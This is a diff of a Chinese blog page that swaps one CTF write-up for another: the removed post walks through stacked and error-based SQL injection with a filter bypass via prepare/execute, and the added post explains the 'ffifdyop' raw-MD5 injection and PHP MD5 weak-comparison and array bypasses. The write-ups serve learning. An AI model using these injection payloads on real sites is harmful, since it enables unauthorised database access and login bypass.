@@ -19,38 +19,34 @@
 
 <script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.14.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
 
-    <meta name="description" content="buuctf [强网杯 2019]随便注">
+    <meta name="description" content="buuctf [BJDCTF2020]Easy MD5">
 <meta property="og:type" content="article">
-<meta property="og:title" content="buuctf 6-[强网杯 2019]随便注">
-<meta property="og:url" content="http://example.com/2023/02/06/buuctf%206-[%E5%BC%BA%E7%BD%91%E6%9D%AF%202019]%E9%9A%8F%E4%BE%BF%E6%B3%A8/index.html">
+<meta property="og:title" content="buuctf 21-[BJDCTF2020]Easy MD5">
+<meta property="og:url" content="http://example.com/2023/02/17/buuctf-21-BJDCTF2020-Easy-MD5/index.html">
 <meta property="og:site_name" content="Have a good day !">
-<meta property="og:description" content="buuctf [强网杯 2019]随便注">
+<meta property="og:description" content="buuctf [BJDCTF2020]Easy MD5">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://rpn8gb60r.hb-bkt.clouddn.com/blog/1674105954316-2834e8d4-05b6-4fbb-aad5-60e2282718e3.png">
-<meta property="og:image" content="http://rpn8gb60r.hb-bkt.clouddn.com/blog/1674107777766-0a679e06-d245-4a7c-9af1-b76701936f7c.png">
-<meta property="og:image" content="http://rpn8gb60r.hb-bkt.clouddn.com/blog/1674106018238-7810382e-073c-4091-b72e-08fcd46441ba.png">
-<meta property="og:image" content="http://rpn8gb60r.hb-bkt.clouddn.com/blog/1674106177437-bba403ed-00ef-4142-bfef-6c0dcb0cb6ff.png">
-<meta property="og:image" content="http://rpn8gb60r.hb-bkt.clouddn.com/blog/1674108504000-bb8f19b7-415c-4345-84ff-9f3573a9cfcc.png">
-<meta property="og:image" content="http://rpn8gb60r.hb-bkt.clouddn.com/blog/1674108794007-3296b6e1-c3c3-4954-80f5-8ce1f9e4f3fa.png">
-<meta property="og:image" content="http://rpn8gb60r.hb-bkt.clouddn.com/blog/1674108615242-30869c84-be6a-4449-96aa-915b3865eac9.png">
-<meta property="article:published_time" content="2023-02-06T06:41:06.000Z">
-<meta property="article:modified_time" content="2023-02-06T06:55:54.176Z">
+<meta property="og:image" content="http://rpn8gb60r.hb-bkt.clouddn.com/blog/1672999020767-45d05848-0cfb-4064-b4a7-353b72c53ba0.png">
+<meta property="og:image" content="http://rpn8gb60r.hb-bkt.clouddn.com/blog/1672999105035-1d740daa-ecd7-4e10-b27c-295c05f5b80c.png">
+<meta property="og:image" content="http://rpn8gb60r.hb-bkt.clouddn.com/blog/1673000414069-7020fab0-2494-4821-a331-05f86dc1911b.png">
+<meta property="og:image" content="http://rpn8gb60r.hb-bkt.clouddn.com/blog/1673001625609-a3c6fa6e-97b6-4575-ba6c-15a379fd3f35.png">
+<meta property="article:published_time" content="2023-02-17T13:27:27.000Z">
+<meta property="article:modified_time" content="2023-02-17T13:30:43.904Z">
 <meta property="article:author" content="Z1d10t">
-<meta property="article:tag" content="sql注入">
-<meta property="article:tag" content="堆叠注入">
-<meta property="article:tag" content="报错注入">
+<meta property="article:tag" content="md5绕过">
+<meta property="article:tag" content="ffifdyop特殊字符串">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://rpn8gb60r.hb-bkt.clouddn.com/blog/1674105954316-2834e8d4-05b6-4fbb-aad5-60e2282718e3.png">
+<meta name="twitter:image" content="http://rpn8gb60r.hb-bkt.clouddn.com/blog/1672999020767-45d05848-0cfb-4064-b4a7-353b72c53ba0.png">
 
 
-<link rel="canonical" href="http://example.com/2023/02/06/buuctf%206-[%E5%BC%BA%E7%BD%91%E6%9D%AF%202019]%E9%9A%8F%E4%BE%BF%E6%B3%A8/">
+<link rel="canonical" href="http://example.com/2023/02/17/buuctf-21-BJDCTF2020-Easy-MD5/">
 
 
 
-<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/2023/02/06/buuctf%206-[%E5%BC%BA%E7%BD%91%E6%9D%AF%202019]%E9%9A%8F%E4%BE%BF%E6%B3%A8/","path":"2023/02/06/buuctf 6-[强网杯 2019]随便注/","title":"buuctf 6-[强网杯 2019]随便注"}</script>
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/2023/02/17/buuctf-21-BJDCTF2020-Easy-MD5/","path":"2023/02/17/buuctf-21-BJDCTF2020-Easy-MD5/","title":"buuctf 21-[BJDCTF2020]Easy MD5"}</script>
 
 <script class="next-config" data-name="calendar" type="application/json">""</script>
-<title>buuctf 6-[强网杯 2019]随便注 | Have a good day !</title>
+<title>buuctf 21-[BJDCTF2020]Easy MD5 | Have a good day !</title>
   
 
 
@@ -178,7 +174,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2023/02/06/buuctf%206-[%E5%BC%BA%E7%BD%91%E6%9D%AF%202019]%E9%9A%8F%E4%BE%BF%E6%B3%A8/">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/02/17/buuctf-21-BJDCTF2020-Easy-MD5/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="http://rpn8gb60r.hb-bkt.clouddn.com/blog/a.png">
@@ -191,12 +187,12 @@
     </span>
 
     <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="buuctf 6-[强网杯 2019]随便注 | Have a good day !">
+      <meta itemprop="name" content="buuctf 21-[BJDCTF2020]Easy MD5 | Have a good day !">
       <meta itemprop="description" content="">
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          buuctf 6-[强网杯 2019]随便注
+          buuctf 21-[BJDCTF2020]Easy MD5
         </h1>
 
         <div class="post-meta-container">
@@ -208,7 +204,7 @@
       <span class="post-meta-item-text">发表于</span>
       
 
-      <time title="创建时间：2023-02-06 14:41:06 / 修改时间：14:55:54" itemprop="dateCreated datePublished" datetime="2023-02-06T14:41:06+08:00">2023-02-06</time>
+      <time title="创建时间：2023-02-17 21:27:27 / 修改时间：21:30:43" itemprop="dateCreated datePublished" datetime="2023-02-17T21:27:27+08:00">2023-02-17</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -237,51 +233,44 @@
     
     
     <div class="post-body" itemprop="articleBody">
-        <p>buuctf [强网杯 2019]随便注</p>
+        <p>buuctf [BJDCTF2020]Easy MD5</p>
 <span id="more"></span>
 
-<p>正常操作后，发现只有两列，然后有正则匹配过滤了</p>
-<p>return preg_match(“/select|update|delete|drop|insert|where|./i”,$inject);</p>
-<p>这题考了堆叠注入，原理很简单，就是通过 <code>;</code> 号注入多条SQL语句。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;;show databases;</span><br></pre></td></tr></table></figure>
+<p><img src="http://rpn8gb60r.hb-bkt.clouddn.com/blog/1672999020767-45d05848-0cfb-4064-b4a7-353b72c53ba0.png" alt="img"></p>
+<p>思路：看到url上又password字样，又有输入栏，随便传入admin然后抓包试试，发现提示。</p>
+<p><img src="http://rpn8gb60r.hb-bkt.clouddn.com/blog/1672999105035-1d740daa-ecd7-4e10-b27c-295c05f5b80c.png" alt="img"></p>
+<p>显示<code>select * from &#39;admin&#39; where password=md5($pass,true)</code></p>
+<p><strong>分析：通过sql语句，从admin表里查数据，当password=md（）函数加密后的pass时就可查询。</strong></p>
+<p><strong>考点：</strong></p>
+<ol>
+<li><strong>sql语句注入</strong></li>
+<li><strong>md5（）函数：本来应该返回32 位的十六进制数形式散列值，但是此题可选的 binary 被设置为 true，那么 md5 摘要将以 16 位的原始二进制格式返回。</strong></li>
+</ol>
+<p>看到作业提示md5在sql注入中常见的搭档是字符串ffifdyop，然后去谷歌，csdn看看这是什么东西。</p>
+<p><strong>ffifdyop</strong></p>
+<p>经过<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=md5&spm=1001.2101.3001.7020">md5</a>加密后：276f722736c95d99e921722cf9ed621c</p>
+<p>再转换为<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E5%AD%97%E7%AC%A6%E4%B8%B2&spm=1001.2101.3001.7020">字符串</a>：’or’6&lt;乱码&gt;  即  ‘or’66�]��!r,��b</p>
+<p><strong>原理：md5（）函数先把</strong> <code>**ffifdyop**</code><strong>加密为</strong><code>**276f722736c95d99e921722cf9ed621c**</code><strong>Mysql 又会把 hex （十六进制）转成 ascii 解释</strong> </p>
+<p> 在or的两边要有单引号，使它变成 password=‘xxx’or‘xxx’ 的形式  </p>
+<p> 因此拼接之后的形式是select * from ‘admin’ where password=’’ or ‘6xxxxx’  为一个永真式</p>
+<p><img src="http://rpn8gb60r.hb-bkt.clouddn.com/blog/1673000414069-7020fab0-2494-4821-a331-05f86dc1911b.png" alt="img"></p>
+<p>输入得到代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="variable">$GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$a</span> != <span class="variable">$b</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>) == <span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>))&#123;</span><br><span class="line">    <span class="comment">// wow, glzjin wants a girl friend.</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="http://rpn8gb60r.hb-bkt.clouddn.com/blog/1674105954316-2834e8d4-05b6-4fbb-aad5-60e2282718e3.png" alt="img"></p>
-<p>看一下当前的数据库，这里考到了报错注入</p>
-<p>原理：</p>
-<p>MySQL提供了一个 updatexml() 函数，当第二个参数包含特殊符号时会报错，并将第二个参数的内容显示在报错信息中。</p>
-<p>但是这题update被过滤了</p>
-<p>extractvalue() 传参时候稍有不同，其余都是一样的，用这两个函数时，常常用到拼接函数，将要要查询的语句和第二个特殊符号拼接起来一起回显。</p>
-<p>sql里拼接函数：concat，concat_ws ,group_concat</p>
-<p><code>1&#39; and extractvalue(1,concat(0x7e,database(),0x7e));</code> 0x7e 是十六进制~</p>
-<p><img src="http://rpn8gb60r.hb-bkt.clouddn.com/blog/1674107777766-0a679e06-d245-4a7c-9af1-b76701936f7c.png" alt="img"></p>
-<p>当前数据库在supersqli 注意结果是按照报错的方式回显的。</p>
-<p><code>-1&#39;;show tables;</code>爆表</p>
-<p><img src="http://rpn8gb60r.hb-bkt.clouddn.com/blog/1674106018238-7810382e-073c-4091-b72e-08fcd46441ba.png" alt="img"></p>
-<p>flag在那串数字里</p>
-<p>表名为数字时，要用反引号包起来查询。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;;show columns from `1919810931114514`;</span><br></pre></td></tr></table></figure>
+<p><strong>分析：通过get传参a，b，使得题目md5值弱相等 。</strong></p>
+<p><strong>方法：</strong></p>
+<ol>
+<li><strong>数组绕过</strong></li>
+<li><strong>md5（）值碰撞，有一些特殊的数值在md5（）加密后会形成0e开头的字符串，从而达到弱相等</strong></li>
+</ol>
+<p><strong>md5（）碰撞原理：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">md5</span>(<span class="string">&#x27;QNKCDZO&#x27;</span>);</span><br><span class="line"><span class="variable">$b</span>=<span class="title function_ invoke__">md5</span>(<span class="string">&#x27;s878926199a&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$a</span>==<span class="variable">$b</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;他们弱相等&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">输出：</span><br><span class="line"><span class="number">0e830400451993494058024219903391</span></span><br><span class="line"><span class="number">0e545993274517709034328855841020</span></span><br><span class="line">他们弱相等</span><br></pre></td></tr></table></figure>
 
-<p><img src="http://rpn8gb60r.hb-bkt.clouddn.com/blog/1674106177437-bba403ed-00ef-4142-bfef-6c0dcb0cb6ff.png" alt="img"></p>
-<p>然后要使用存储过程预编译知识，构造能执行的语句</p>
-<p>方法一：</p>
-<p>set @name1 = sql 语句；</p>
-<p>prepare name2 from @name1</p>
-<p>EXECUTE name2</p>
-<p>注意：一个@是用户变量，两个@是系统变量</p>
-<p>方法二：</p>
-<p>prepare name1 from 一个sql语句;</p>
-<p>EXECUTE name1；</p>
-<p>name1,name2的意思是一个名字</p>
-<p>其实两者原理都一样</p>
-<p>构造：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;set @a = concat(&#x27;se&#x27;,&#x27;lect * from `1919810931114514`;&#x27;);prepare b from @a;EXECUTE b;</span><br></pre></td></tr></table></figure>
+<p>选择任何方法都行，之后得到：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;param1&#x27;</span>]!==<span class="variable">$_POST</span>[<span class="string">&#x27;param2&#x27;</span>]&amp;&amp;<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;param1&#x27;</span>])===<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;param2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p><img src="http://rpn8gb60r.hb-bkt.clouddn.com/blog/1674108504000-bb8f19b7-415c-4345-84ff-9f3573a9cfcc.png" alt="img"></p>
-<p>strstr()函数对大小写很敏感，通过大写绕过即可。</p>
-<p><img src="http://rpn8gb60r.hb-bkt.clouddn.com/blog/1674108794007-3296b6e1-c3c3-4954-80f5-8ce1f9e4f3fa.png" alt="img"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;Set @a = concat(&#x27;se&#x27;,&#x27;lect * from `1919810931114514`;&#x27;); Prepare b from @a; EXECUTE b;</span><br></pre></td></tr></table></figure>
-
-<p><img src="http://rpn8gb60r.hb-bkt.clouddn.com/blog/1674108615242-30869c84-be6a-4449-96aa-915b3865eac9.png" alt="img"></p>
+<p>同理，不过之后是强类型相等，估计这一关是考察数组绕过吧，之后得到flag</p>
+<p><img src="http://rpn8gb60r.hb-bkt.clouddn.com/blog/1673001625609-a3c6fa6e-97b6-4575-ba6c-15a379fd3f35.png" alt="img"></p>
 
     </div>
 
@@ -299,7 +288,7 @@
   </li>
   <li class="post-copyright-link">
       <strong>本文链接：</strong>
-      <a href="http://example.com/2023/02/06/buuctf%206-[%E5%BC%BA%E7%BD%91%E6%9D%AF%202019]%E9%9A%8F%E4%BE%BF%E6%B3%A8/" title="buuctf 6-[强网杯 2019]随便注">http://example.com/2023/02/06/buuctf 6-[强网杯 2019]随便注/</a>
+      <a href="http://example.com/2023/02/17/buuctf-21-BJDCTF2020-Easy-MD5/" title="buuctf 21-[BJDCTF2020]Easy MD5">http://example.com/2023/02/17/buuctf-21-BJDCTF2020-Easy-MD5/</a>
   </li>
   <li class="post-copyright-license">
     <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
@@ -308,23 +297,19 @@
 </div>
 
           <div class="post-tags">
-              <a href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag"># sql注入</a>
-              <a href="/tags/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/" rel="tag"># 堆叠注入</a>
-              <a href="/tags/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/" rel="tag"># 报错注入</a>
+              <a href="/tags/md5%E7%BB%95%E8%BF%87/" rel="tag"># md5绕过</a>
+              <a href="/tags/ffifdyop%E7%89%B9%E6%AE%8A%E5%AD%97%E7%AC%A6%E4%B8%B2/" rel="tag"># ffifdyop特殊字符串</a>
           </div>
 
         
 
           <div class="post-nav">
             <div class="post-nav-item">
-                <a href="/2023/02/05/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%A0%B4%E5%A3%B3%E4%BA%86/" rel="prev" title="小破站破壳了">
-                  <i class="fa fa-chevron-left"></i> 小破站破壳了
+                <a href="/2023/02/07/buuctf%2020-%5B%E6%8A%A4%E7%BD%91%E6%9D%AF%202018%5Deasy_tornado/" rel="prev" title="buuctf 20-[护网杯 2018]easy_tornado">
+                  <i class="fa fa-chevron-left"></i> buuctf 20-[护网杯 2018]easy_tornado
                 </a>
             </div>
             <div class="post-nav-item">
-                <a href="/2023/02/07/buuctf-18-RoarCTF-2019-Easy-Calc/" rel="next" title="buuctf 18-[RoarCTF 2019]Easy Calc">
-                  buuctf 18-[RoarCTF 2019]Easy Calc <i class="fa fa-chevron-right"></i>
-                </a>
             </div>
           </div>
     </footer>
